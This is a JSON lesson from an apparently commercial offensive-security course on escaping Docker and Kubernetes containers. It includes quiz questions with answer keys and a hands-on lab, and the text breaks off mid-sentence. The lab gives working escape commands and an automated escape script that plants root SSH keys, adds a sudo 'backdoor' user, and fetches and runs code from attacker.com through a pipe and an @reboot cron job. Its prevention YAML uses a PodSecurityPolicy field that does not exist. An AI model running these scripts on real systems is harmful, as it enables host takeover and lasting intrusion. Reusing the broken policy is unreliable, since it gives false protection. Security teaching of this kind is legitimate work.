{
  "lesson_id": "d8b9c0d1-f2a3-4b5c-6d7e-8f9a0b1c2d3e",
  "domain": "cloud",
  "title": "Container Breakout Techniques: Escaping Docker and Kubernetes",
  "difficulty": 3,
  "order_index": 124,
  "prerequisites": ["b6f7a8b9-d0e1-4f2a-3b4c-5d6e7f8a9b0c"],
  "concepts": [
    "Container isolation mechanisms (namespaces, cgroups, capabilities)",
    "Docker daemon socket exploitation",
    "Privileged container escape techniques",
    "Host filesystem mounting attacks",
    "Kernel exploitation for container escape",
    "Capabilities abuse and elevation",
    "Container runtime vulnerabilities (runc, containerd)",
    "seccomp and AppArmor bypass techniques",
    "Kubernetes pod escape vectors",
    "Container-to-host lateral movement"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Linux container isolation primitives and security boundaries",
    "Exploit Docker socket mounts to escape containers",
    "Perform privileged container escapes to host systems",
    "Abuse Linux capabilities for privilege escalation",
    "Exploit kernel vulnerabilities from containers (Dirty COW, Dirty Pipe)",
    "Bypass seccomp and AppArmor security profiles",
    "Exploit container runtime vulnerabilities (CVE analysis)",
    "Escape from Kubernetes pods to worker nodes",
    "Perform post-escape lateral movement and persistence",
    "Implement detection and prevention for container escapes"
  ],
  "post_assessment": [
    {
      "question_id": "cbe-001",
      "question": "What is the PRIMARY reason that mounting the Docker socket (/var/run/docker.sock) inside a container is dangerous?",
      "options": [
        "It consumes excessive disk space and degrades performance",
        "It allows the container to create new privileged containers and escape to the host",
        "It prevents other containers from accessing the Docker daemon",
        "It causes Docker networking to fail for all containers"
      ],
      "correct_answer": 1,
      "explanation": "Mounting /var/run/docker.sock inside a container gives that container full control over the Docker daemon, which runs as root on the host. The container can use the Docker API to create new privileged containers with host filesystem mounts, effectively achieving root access on the host. This is one of the easiest and most reliable container escape techniques. The other options are incorrect - socket mounting doesn't significantly impact performance, doesn't block other containers, and doesn't affect networking.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "cbe-002",
      "question": "A container is running with the --privileged flag. Which of the following is NOT automatically granted to the container?",
      "options": [
        "All Linux capabilities (CAP_SYS_ADMIN, CAP_NET_ADMIN, etc.)",
        "Access to all host devices (/dev/*)",
        "Root password for the host system",
        "Ability to load kernel modules"
      ],
      "correct_answer": 2,
      "explanation": "The --privileged flag grants extensive permissions including all Linux capabilities, access to all host devices, and the ability to load kernel modules. However, it does NOT provide the root password for the host system. Privileged containers can still achieve root access on the host through other means (mounting host filesystem, exploiting capabilities, etc.), but the host's authentication credentials are not automatically provided. Privileged containers essentially disable most security isolation.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "cbe-003",
      "question": "Which Linux capability is MOST dangerous when granted to a container and why?",
      "options": [
        "CAP_NET_BIND_SERVICE - allows binding to privileged ports below 1024",
        "CAP_SYS_ADMIN - allows mount operations and namespace manipulation",
        "CAP_KILL - allows sending signals to any process",
        "CAP_CHOWN - allows changing file ownership"
      ],
      "correct_answer": 1,
      "explanation": "CAP_SYS_ADMIN is the most dangerous capability as it grants numerous powerful operations including mounting filesystems, manipulating namespaces, and performing privileged operations. With CAP_SYS_ADMIN, an attacker can mount the host filesystem, escape container isolation, or create new namespaces to bypass security controls. While the other capabilities can be abused, they provide much more limited attack surfaces. CAP_SYS_ADMIN is often called the 'new root' because it enables so many privileged operations.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "cbe-004",
      "question": "What technique allows an attacker to escape a container by exploiting the way container runtimes handle file descriptors?",
      "options": [
        "Symlink race conditions in /proc filesystem",
        "Exploiting runc CVE-2019-5736 to overwrite the host runc binary",
        "Buffer overflow in container networking stack",
        "DNS rebinding attacks against container runtime API"
      ],
      "correct_answer": 1,
      "explanation": "CVE-2019-5736 was a critical runc vulnerability where an attacker could overwrite the host runc binary by exploiting how runc handled file descriptors during container execution. When the host executed runc to perform operations, it would execute the attacker's malicious binary with root privileges on the host. This was an extremely powerful escape technique affecting Docker, Kubernetes, and all systems using runc. The other options represent different attack classes but not this specific file descriptor exploitation technique.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "cbe-005",
      "question": "In Kubernetes, what configuration makes a pod MOST vulnerable to container escape?",
      "options": [
        "Setting hostNetwork: true only",
        "Setting privileged: true with hostPath volume mounts",
        "Using a public container image from Docker Hub",
        "Running the pod in the default namespace"
      ],
      "correct_answer": 1,
      "explanation": "The combination of privileged: true and hostPath volume mounts is the most dangerous configuration. Privileged mode disables security isolation and grants all capabilities, while hostPath mounts provide direct access to host filesystem paths. Together, these configurations essentially eliminate container boundaries and provide an easy escape to the host. While hostNetwork:true can expose the host's network stack, it alone doesn't provide filesystem access. Public images and default namespace are security concerns but don't directly enable container escape like privileged+hostPath.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to Container Breakout Techniques! üê≥üîì\n\nYou're about to master one of the most critical skills in modern security: **escaping containerized environments**. This isn't theoretical‚Äîevery major cloud provider, every Kubernetes cluster, and every Docker deployment is potentially vulnerable to these attacks.\n\n**Why Container Escapes Matter:**\n\nüéØ **Containers are everywhere**: 80%+ of organizations use containers in production\n\nüéØ **False sense of security**: \"It's containerized, so it's isolated\" ‚Üê WRONG!\n\nüéØ **Crown jewels within reach**: Container escapes often lead directly to host systems with cloud credentials, secrets, and access to entire clusters\n\nüéØ **Lateral movement highway**: One escaped container can compromise hundreds of hosts\n\n**Real-World Impact:**\n\nüí• **Tesla Cryptomining (2018)**: Attackers escaped Kubernetes containers ‚Üí deployed miners across entire cluster ‚Üí $thousands in compute costs\n\nüí• **Capital One Breach (2019)**: While not a container escape, showed how containerized apps can be exploited ‚Üí SSRF ‚Üí instance metadata ‚Üí 100M+ records stolen\n\nüí• **Runc CVE-2019-5736**: Critical container escape affecting Docker, Kubernetes, and all container platforms ‚Üí allowed root access on host\n\nüí• **Azurescape (2021)**: Container escape in Azure Container Instances ‚Üí allowed access to other customers' containers\n\n**What You'll Master:**\n\nBy the end of this lesson, you'll know:\n- How Linux containers achieve isolation (and where it breaks)\n- Docker socket exploitation for trivial escapes\n- Privileged container escape techniques\n- Kernel exploitation from containers\n- Linux capabilities abuse\n- Container runtime vulnerabilities\n- Kubernetes-specific escape vectors\n- Post-escape lateral movement\n\n**The Container Security Paradox:**\n\nOrganizations believe:\n‚úÖ \"Containers are secure by default\"\n‚úÖ \"Container isolation prevents escapes\"\n‚úÖ \"We're safe if we use Kubernetes\"\n\nReality:\n‚ùå Containers use kernel-level isolation (namespaces) - not separate VMs\n‚ùå Misconfigurations (privileged mode, host mounts) destroy isolation\n‚ùå Kernel vulnerabilities affect ALL containers on the host\n‚ùå Container runtimes have exploitable bugs\n\n**Your Security Journey:**\n\nYou've built incredible skills:\n- ‚úÖ Cloud pentesting methodology\n- ‚úÖ Identity attacks (Entra ID, AWS IAM)\n- ‚úÖ Compute exploitation (VMs, Azure Automation)\n- ‚úÖ Cloud-native application attacks\n- ‚úÖ CI/CD pipeline compromise\n\nNow you're mastering **the container layer** - where applications run, where isolation should work, and where it often fails catastrophically.\n\n**The Stakes:**\n\nWhen you escape a container:\n- ‚ò†Ô∏è Host system = compromised\n- ‚ò†Ô∏è Cloud credentials on host = stolen\n- ‚ò†Ô∏è All containers on host = accessible\n- ‚ò†Ô∏è Kubernetes control plane = potential target\n- ‚ò†Ô∏è Entire cluster = at risk\n\n**One escape = thousands of compromised systems**\n\n**What Makes You Dangerous:**\n\nMost security professionals:\n- Know containers exist\n- Understand basic Docker commands\n- Maybe know about privileged mode\n\nYou will:\n- Understand kernel-level isolation primitives\n- Exploit namespace and cgroup weaknesses\n- Abuse Linux capabilities systematically\n- Leverage kernel vulnerabilities for escapes\n- Chain multiple techniques for reliable breakouts\n\n**This is elite-level knowledge.**\n\n**Career Impact:**\n\nüíº **Container Security Specialist**: $140k-$230k\n\nüêõ **Bug Bounty**: Container escapes = $10k-$50k+ payouts\n\nüéØ **Penetration Tester**: Container expertise commands premium rates\n\nüõ°Ô∏è **Security Architect**: Design secure containerized infrastructure\n\n**Remember**: These techniques are for authorized testing only. Unauthorized access is illegal.\n\nLet's break out of containers! üöÄ"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Teach Me Like I'm 10: What Are Containers and Why Can We Escape?\n\nImagine you live in an apartment building. Let's understand containers through this analogy:\n\n**Virtual Machines = Separate Houses**\n- Each house has its own walls, roof, electricity, water\n- If one house catches fire, others are safe\n- Houses are COMPLETELY separate\n- Very secure, but expensive (each needs its own everything)\n\n**Containers = Apartments in One Building**\n- All apartments share the same building (kernel)\n- All apartments share the same plumbing (host resources)\n- All apartments share the same foundation (hardware)\n- Cheaper and faster, but less separated\n- If you break through your apartment wall, you can reach other apartments!\n\n### What Is Container \"Isolation\"?\n\n**Container isolation is like apartment walls:**\n\nüè¢ **Walls** = Namespaces (you can't SEE your neighbors)\n- Process namespace: \"You can't see your neighbor's TV\"\n- Network namespace: \"You can't hear your neighbor's phone calls\"\n- Mount namespace: \"You can't open your neighbor's closet\"\n- User namespace: \"You're not the landlord even if you think you are\"\n\nüö™ **Locks on doors** = Capabilities (you can't DO certain things)\n- Can't knock down walls (no CAP_SYS_ADMIN)\n- Can't change building temperature (no CAP_SYS_BOOT)\n- Can't rewire electricity (no CAP_NET_ADMIN)\n\nüìã **Building rules** = cgroups (limits on what you can use)\n- \"You can only use 2 bedrooms\" (CPU limit)\n- \"You can only store 100 boxes\" (memory limit)\n- \"You can only use 10 parking spots\" (I/O limit)\n\nüîí **Security guard** = seccomp/AppArmor (blocks dangerous actions)\n- \"You can't access the basement\" (syscall filtering)\n- \"You can't go on the roof\" (file access control)\n\n### Why Container Isolation Breaks (Escapes)\n\n**Problem 1: We All Share The Same Building (Kernel)**\n\nIf you find a crack in the BUILDING'S foundation, you can:\n- Access the building's structure\n- Go anywhere in the building\n- Become the landlord (root on host)\n\n**Real example: Dirty COW vulnerability**\n- Bug in the building's foundation (Linux kernel)\n- From your apartment, you could modify the landlord's master key\n- Suddenly you're the landlord ‚Üí access all apartments\n\n**Problem 2: Some Apartments Have Master Keys (Privileged Containers)**\n\n```bash\ndocker run --privileged ...\n```\n\n**This is like saying:**\n- \"Here's the master key to all apartments\"\n- \"Here's access to the basement, roof, and maintenance room\"\n- \"Here's permission to knock down walls\"\n- \"You're basically the landlord now\"\n\n**Why would anyone do this?** Sometimes containers need special access, but it's VERY dangerous.\n\n**Problem 3: Sharing Too Much (Volume Mounts)**\n\n```bash\ndocker run -v /:/host ...\n```\n\n**This is like:**\n- Installing a door between your apartment and the landlord's office\n- Now you can walk right into the office\n- Access all keys, documents, and controls\n- You don't even need to break through walls!\n\n**Problem 4: Thin Walls (Namespace Isolation Isn't Perfect)**\n\nApartment walls are thin:\n- If you drill through, you can access other apartments\n- If you find a vent connecting apartments, you can crawl through\n- If you find the landlord's master control panel, you control everything\n\n**Container namespaces are similar:**\n- They hide things, but don't create true separation\n- If you break through one namespace, you can escape others\n- They all depend on the same kernel\n\n### Container Escape = Breaking Out of Your Apartment\n\n**Level 1 Escape: From Your Apartment to the Hallway**\n- You're out of your apartment\n- You can see other apartments\n- You can try their doors\n\n**Container equivalent:** Breaking namespace isolation\n\n**Level 2 Escape: From Hallway to Landlord's Office**\n- You're in the control room\n- You can access all keys\n- You can see everyone's personal info\n\n**Container equivalent:** Accessing the host system\n\n**Level 3 Escape: Becoming the Landlord**\n- You ARE the landlord now\n- You control the entire building\n- You can evict people, change locks, access everything\n\n**Container equivalent:** Root access on the host\n\n### Real Attack Example: The Docker Socket Escape\n\n**Scenario:**\nYour apartment has a pneumatic tube connecting to the landlord's office.\n\n**Attack:**\n1. You write a message: \"Dear landlord, please give me a master key\"\n2. You send it through the tube to the landlord's office\n3. Landlord follows your instructions (doesn't realize it's you!)\n4. Landlord sends back the master key\n5. You're now the landlord\n\n**In container terms:**\n```bash\n# From inside container with /var/run/docker.sock mounted\ndocker run -v /:/host --privileged alpine chroot /host /bin/bash\n# Boom! You're root on the host\n```\n\nThe \"pneumatic tube\" is the Docker socket. If it's mounted in your container, you can control Docker = control the host.\n\n### Defense: Making Apartments More Secure\n\n**Better Walls (Security Hardening):**\n- Thicker walls (stronger namespaces)\n- No master keys (no privileged containers)\n- No shared doors (no host volume mounts)\n- Security cameras (monitoring and logging)\n\n**Security Guards (Security Policies):**\n- Check everyone at the door (admission controllers)\n- Limit what residents can do (Pod Security Standards)\n- Watch for suspicious behavior (runtime security)\n\n**Separate Buildings (Better Isolation):**\n- Use gVisor or Kata Containers (VM-level isolation for containers)\n- Like building separate houses instead of apartments\n- More expensive, but much more secure\n\n---\n\n**Bottom Line:**\n\nContainers are like apartments - they share a building (kernel). That sharing makes them fast and cheap, but also means:\n- üèóÔ∏è **Shared foundation** = kernel vulnerabilities affect all containers\n- üö™ **Thin walls** = namespaces can be bypassed\n- üîë **Misconfigurations** = privileged mode = instant escape\n- üîì **Shared doors** = Docker socket = landlord access\n\nYour job? Either **break out** (pentesting) or **keep people in** (defense)!\n\nLet's learn how! üéØ"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Container Isolation Primitives: Understanding the Security Model\n\nTo exploit containers effectively, you must understand how they achieve isolation. Containers aren't magic - they're a collection of Linux kernel features working together.\n\n### The Three Pillars of Container Isolation\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ              CONTAINER ISOLATION                       ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ                                                        ‚îÇ\n‚îÇ   1. NAMESPACES     ‚Üí Visibility Isolation            ‚îÇ\n‚îÇ      (What you can SEE)                               ‚îÇ\n‚îÇ      - PID namespace:   See only your processes       ‚îÇ\n‚îÇ      - NET namespace:   See only your network         ‚îÇ\n‚îÇ      - MNT namespace:   See only your filesystem      ‚îÇ\n‚îÇ      - UTS namespace:   See only your hostname        ‚îÇ\n‚îÇ      - IPC namespace:   See only your IPC objects     ‚îÇ\n‚îÇ      - USER namespace:  See only your UID/GID map     ‚îÇ\n‚îÇ                                                        ‚îÇ\n‚îÇ   2. CGROUPS        ‚Üí Resource Limits                 ‚îÇ\n‚îÇ      (What you can USE)                               ‚îÇ\n‚îÇ      - CPU limits:      Max CPU usage                 ‚îÇ\n‚îÇ      - Memory limits:   Max RAM usage                 ‚îÇ\n‚îÇ      - I/O limits:      Max disk/network I/O          ‚îÇ\n‚îÇ      - PIDs limit:      Max processes                 ‚îÇ\n‚îÇ                                                        ‚îÇ\n‚îÇ   3. CAPABILITIES   ‚Üí Permission Restrictions         ‚îÇ\n‚îÇ      (What you can DO)                                ‚îÇ\n‚îÇ      - Reduced from 100+ to ~15 default capabilities  ‚îÇ\n‚îÇ      - No CAP_SYS_ADMIN    = Can't mount filesystems  ‚îÇ\n‚îÇ      - No CAP_NET_ADMIN    = Can't change network     ‚îÇ\n‚îÇ      - No CAP_SYS_MODULE   = Can't load kernel mods   ‚îÇ\n‚îÇ                                                        ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n### Linux Namespaces: Detailed Breakdown\n\n#### 1. PID Namespace (Process Isolation)\n\n**What it does:**\n- Isolates process IDs\n- Container sees PID 1 as its init process\n- Cannot see host processes\n\n**How to view:**\n```bash\n# From host\nps aux | grep my-container-process\n# PID on host: 12345\n\n# From inside container\nps aux\n# Same process shows as PID 1\n```\n\n**Attack vector:**\n- Break PID namespace ‚Üí see all host processes\n- Identify sensitive processes (ssh, kubelet, containerd)\n- Kill processes, inspect memory, ptrace attach\n\n**Escape technique:**\n```bash\n# If you have CAP_SYS_ADMIN\nnsenter -t 1 -p /bin/bash\n# Now in host PID namespace\n```\n\n#### 2. Mount Namespace (Filesystem Isolation)\n\n**What it does:**\n- Isolates filesystem mount points\n- Container has its own filesystem tree\n- Cannot see host filesystems unless mounted\n\n**Default container filesystem:**\n```\nContainer root:\n/\n‚îú‚îÄ‚îÄ bin/\n‚îú‚îÄ‚îÄ etc/\n‚îú‚îÄ‚îÄ home/\n‚îú‚îÄ‚îÄ proc/      ‚Üê Container's proc\n‚îú‚îÄ‚îÄ sys/       ‚Üê Container's sys\n‚îî‚îÄ‚îÄ tmp/\n\nHost root:\n/\n‚îú‚îÄ‚îÄ bin/\n‚îú‚îÄ‚îÄ etc/\n‚îú‚îÄ‚îÄ home/\n‚îú‚îÄ‚îÄ proc/      ‚Üê Host's proc (different!)\n‚îî‚îÄ‚îÄ var/\n    ‚îî‚îÄ‚îÄ lib/\n        ‚îî‚îÄ‚îÄ docker/   ‚Üê All container data\n```\n\n**Attack vector:**\n- Break mount namespace ‚Üí access host filesystem\n- Mount host's / inside container\n- Access /etc/shadow, SSH keys, secrets\n\n#### 3. Network Namespace (Network Isolation)\n\n**What it does:**\n- Isolates network interfaces, routing tables, firewall rules\n- Container has its own network stack\n- Typically connected via virtual ethernet (veth) pair\n\n**Architecture:**\n```\nHost Network Namespace\n‚îú‚îÄ‚îÄ eth0 (10.0.0.5)           ‚Üê Host's real network\n‚îú‚îÄ‚îÄ docker0 (172.17.0.1)      ‚Üê Docker bridge\n‚îî‚îÄ‚îÄ veth123 ‚Üê--‚Üí Container's eth0 (172.17.0.2)\n\nContainer Network Namespace\n‚îî‚îÄ‚îÄ eth0 (172.17.0.2)         ‚Üê Container's network\n```\n\n**Attack vector:**\n- Break network namespace ‚Üí see all host traffic\n- Sniff traffic from other containers\n- Access host services (kubelet, docker daemon)\n\n**Escape technique:**\n```bash\n# If you have CAP_NET_ADMIN or hostNetwork:true\nnsenter -t 1 -n /bin/bash\n# Now in host network namespace\n```\n\n#### 4. User Namespace (UID/GID Remapping)\n\n**What it does:**\n- Maps container UIDs to different host UIDs\n- Root inside container (UID 0) != root on host\n\n**UID mapping example:**\n```\nContainer UID  ‚Üí  Host UID\n0 (root)       ‚Üí  100000\n1 (daemon)     ‚Üí  100001\n1000 (user)    ‚Üí  101000\n```\n\n**The problem:** User namespaces are often NOT enabled!\n\n```bash\n# Check if user namespaces are active\ncat /proc/self/uid_map\n# If output is: \"0 0 4294967295\"\n# ‚Üí User namespaces NOT active\n# ‚Üí Container root = host root (DANGEROUS!)\n```\n\n**Attack implication:**\n- Most containers run with root inside = root on host\n- Escape container ‚Üí already root on host\n- No additional privilege escalation needed\n\n### Linux Capabilities: Fine-Grained Permissions\n\nLinux capabilities split root privileges into distinct units.\n\n**Default Docker capabilities (~15):**\n```\nCHOWN, DAC_OVERRIDE, FOWNER, FSETID,\nKILL, SETGID, SETUID, SETPCAP,\nNET_BIND_SERVICE, NET_RAW,\nSYS_CHROOT, MKNOD, AUDIT_WRITE, SETFCAP\n```\n\n**Dangerous capabilities (dropped by default):**\n```\nüî¥ CAP_SYS_ADMIN    ‚Üí Mount filesystems, manipulate namespaces\nüî¥ CAP_SYS_MODULE   ‚Üí Load/unload kernel modules\nüî¥ CAP_SYS_PTRACE   ‚Üí Trace arbitrary processes\nüî¥ CAP_SYS_BOOT     ‚Üí Reboot system\nüî¥ CAP_NET_ADMIN    ‚Üí Network configuration\nüî¥ CAP_SYS_RAWIO    ‚Üí Direct hardware access\n```\n\n**Capability exploitation example:**\n\nIf container has `CAP_SYS_ADMIN`:\n```bash\n# Mount host filesystem\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\ncd /mnt/host\n# Full host filesystem access!\n\n# Add SSH key for persistence\nmkdir /mnt/host/root/.ssh\necho \"ssh-rsa AAAA... attacker@evil\" >> /mnt/host/root/.ssh/authorized_keys\n\n# SSH to host as root\nssh root@host-ip\n```\n\n### cgroups: Resource Limits\n\ncgroups control resource allocation but have limited security implications.\n\n**What they do:**\n- Limit CPU, memory, I/O\n- Prevent resource exhaustion DoS\n\n**Security impact:**\n- Don't prevent escapes\n- Can be abused for resource-based attacks\n- Example: Fork bomb despite PID limits\n\n### seccomp: System Call Filtering\n\nSeccomp (Secure Computing Mode) restricts system calls.\n\n**Default Docker seccomp profile blocks ~60 dangerous syscalls:**\n```\nBlocked:\n- clone, unshare  ‚Üí Namespace manipulation\n- mount, umount   ‚Üí Filesystem manipulation\n- reboot, swapon  ‚Üí System control\n- ptrace          ‚Üí Process debugging\n- keyctl          ‚Üí Kernel keyring access\n```\n\n**Check seccomp status:**\n```bash\ngrep Seccomp /proc/self/status\n# Seccomp: 2 ‚Üí Filtering active\n# Seccomp: 0 ‚Üí No filtering (dangerous!)\n```\n\n**Seccomp bypass:**\n```bash\n# If container runs with --security-opt seccomp=unconfined\n# ALL syscalls allowed ‚Üí easy escapes\n```\n\n### Complete Isolation Breakdown\n\n**Strong Container (Default Docker):**\n```\n‚úÖ PID namespace       ‚Üí Can't see host processes\n‚úÖ Mount namespace     ‚Üí Can't see host filesystem\n‚úÖ Network namespace   ‚Üí Isolated network\n‚úÖ ~15 capabilities    ‚Üí Most dangerous caps dropped\n‚úÖ seccomp enabled     ‚Üí Dangerous syscalls blocked\n‚úÖ AppArmor/SELinux    ‚Üí MAC enforced\n‚ùå User namespace      ‚Üí Root = root (not ideal)\n```\n\n**Weak Container (Misconfigured):**\n```\n‚ùå Privileged mode         ‚Üí All capabilities granted\n‚ùå Host volume mounts      ‚Üí Access to host filesystem\n‚ùå Docker socket mount     ‚Üí Full Docker control\n‚ùå hostPID: true           ‚Üí See all host processes\n‚ùå hostNetwork: true       ‚Üí Use host network\n‚ùå seccomp: unconfined     ‚Üí All syscalls allowed\n```\n\n**Result:** Weak container = trivial escape\n\nIn the following sections, we'll exploit each weakness systematically."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On Lab 1: Docker Socket Escape (Easiest and Most Common)\n\nThe Docker socket (`/var/run/docker.sock`) is a Unix socket that allows communication with the Docker daemon. If mounted inside a container, it grants FULL Docker control.\n\n### Why This Is Dangerous\n\n```\nContainer with Docker socket mounted\n     ‚Üì\nCan control Docker daemon (runs as root on host)\n     ‚Üì\nCan create privileged containers\n     ‚Üì\nCan mount host filesystem in new container\n     ‚Üì\nRoot access on host\n```\n\n### Attack Scenario\n\nYou've compromised a container and discovered `/var/run/docker.sock` is mounted:\n\n```bash\n# Check for Docker socket\nls -la /var/run/docker.sock\n# srw-rw---- 1 root docker 0 Jan 10 15:30 /var/run/docker.sock\n\n# If it exists, you can escape!\n```\n\n### Method 1: Using Docker CLI Inside Container\n\n**Step 1: Verify Docker access**\n\n```bash\n# Install Docker CLI if not present\nwhich docker || {\n  apk add docker-cli ||  # Alpine\n  apt-get update && apt-get install -y docker.io  # Debian/Ubuntu\n}\n\n# Test Docker access\ndocker ps\n# Should list all containers on the host!\n```\n\n**Step 2: Create privileged container with host mount**\n\n```bash\n# Create escape container\ndocker run -it --rm \\\n  --privileged \\\n  -v /:/host \\\n  alpine:latest \\\n  chroot /host /bin/bash\n\n# You're now root on the host!\nwhoami\n# root\n\nhostname\n# <host-hostname>\n\ncat /etc/shadow\n# Success! Can read host files\n```\n\n**Step 3: Establish persistence**\n\n```bash\n# Add SSH key\nmkdir -p /root/.ssh\necho \"ssh-rsa AAAA...attacker@evil\" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\n\n# Create backdoor user\nuseradd -m -s /bin/bash -G sudo backdoor\necho \"backdoor:P@ssw0rd123\" | chpasswd\n\n# Install malware\ncurl https://attacker.com/malware.sh | bash\n```\n\n### Method 2: Using Curl with Docker API (No Docker CLI Needed)\n\n```bash\n# Docker socket speaks HTTP over Unix socket\n# We can use curl with --unix-socket flag\n\n# List containers\ncurl --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n# Create escape container\ncurl --unix-socket /var/run/docker.sock \\\n  -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"Image\": \"alpine:latest\",\n    \"Cmd\": [\"/bin/sh\", \"-c\", \"chroot /host /bin/bash\"],\n    \"HostConfig\": {\n      \"Privileged\": true,\n      \"Binds\": [\"/:/host\"]\n    },\n    \"AttachStdin\": true,\n    \"AttachStdout\": true,\n    \"AttachStderr\": true,\n    \"Tty\": true,\n    \"OpenStdin\": true\n  }' \\\n  http://localhost/containers/create\n\n# Response includes container ID\n# {\"Id\":\"abc123...\",\"Warnings\":null}\n\n# Start container\nCONTAINER_ID=\"abc123...\"\ncurl --unix-socket /var/run/docker.sock \\\n  -X POST \\\n  http://localhost/containers/$CONTAINER_ID/start\n\n# Attach to container\ncurl --unix-socket /var/run/docker.sock \\\n  -X POST \\\n  http://localhost/containers/$CONTAINER_ID/attach?stream=1&stdin=1&stdout=1&stderr=1\n```\n\n### Method 3: Automated Escape Script\n\n```bash\n#!/bin/bash\n# docker_socket_escape.sh\n\nSOCK=\"/var/run/docker.sock\"\n\nif [ ! -S \"$SOCK\" ]; then\n  echo \"[-] Docker socket not found at $SOCK\"\n  exit 1\nfi\n\necho \"[+] Docker socket found!\"\necho \"[+] Creating escape container...\"\n\n# Create privileged container with host root mounted\ndocker run -d \\\n  --name escape_container \\\n  --privileged \\\n  --pid=host \\\n  --net=host \\\n  --ipc=host \\\n  --volume /:/host \\\n  alpine:latest \\\n  sleep 3600\n\necho \"[+] Container created. Executing escape...\"\n\n# Execute commands on host via container\ndocker exec escape_container chroot /host /bin/bash -c '\n  echo \"[+] Escaped to host!  \"\n  echo \"[+] Hostname: $(hostname)\"\n  echo \"[+] UID: $(id)\"\n  \n  echo \"[+] Installing backdoor...\"\n  \n  # Add SSH key\n  mkdir -p /root/.ssh\n  echo \"ssh-rsa AAAA...\" >> /root/.ssh/authorized_keys\n  \n  # Add to crontab for persistence\n  (crontab -l 2>/dev/null; echo \"@reboot curl -s attacker.com/persist.sh | bash\") | crontab -\n  \n  echo \"[+] Backdoor installed!\"\n  echo \"[+] You can now SSH to the host as root\"\n'\n\n# Cleanup\ndocker stop escape_container\ndocker rm escape_container\n\necho \"[+] Escape complete and cleaned up!\"\n```\n\n### Real-World Example: Kubernetes DaemonSet Escape\n\nMany Kubernetes DaemonSets mount the Docker socket for monitoring or management:\n\n```yaml\n# Vulnerable DaemonSet\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-monitor\nspec:\n  template:\n    spec:\n      containers:\n      - name: monitor\n        image: monitoring-tool:latest\n        volumeMounts:\n        - name: docker-sock\n          mountPath: /var/run/docker.sock  # ‚Üê DANGEROUS!\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n```\n\nIf you compromise this monitoring container, you can escape to EVERY node in the cluster!\n\n### Detection and Prevention\n\n**Detection:**\n\n```bash\n# Audit Docker socket mounts\ndocker ps --format '{{.Names}}' | while read container; do\n  if docker inspect $container | grep -q \"/var/run/docker.sock\"; then\n    echo \"[!] ALERT: $container has Docker socket mounted!\"\n  fi\ndone\n\n# Monitor Docker API calls from containers\nauditctl -w /var/run/docker.sock -p rwxa -k docker_socket_access\n```\n\n**Prevention:**\n\n```yaml\n# Kubernetes: Block Docker socket mounts with Pod Security Policy\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: restricted\nspec:\n  allowedHostPaths:\n  # Do NOT include /var/run/docker.sock\n  - pathPrefix: \"/etc\"\n    readOnly: true\n  - pathPrefix: \"/var/log\"\n    readOnly: false\n  # Explicitly deny docker socket\n  forbiddenHostPaths:\n  - \"/var/run/docker.sock\"\n```\n\n**Alternative: Read-only Docker socket access**\n\nIf monitoring requires Docker access, use read-only socket:\n\n```yaml\nvolumeMounts:\n- name: docker-sock\n  mountPath: /var/run/docker.sock\n  readOnly: true  # Limits damage but still risky\n```\n\n**Best Practice: Don't mount Docker socket at 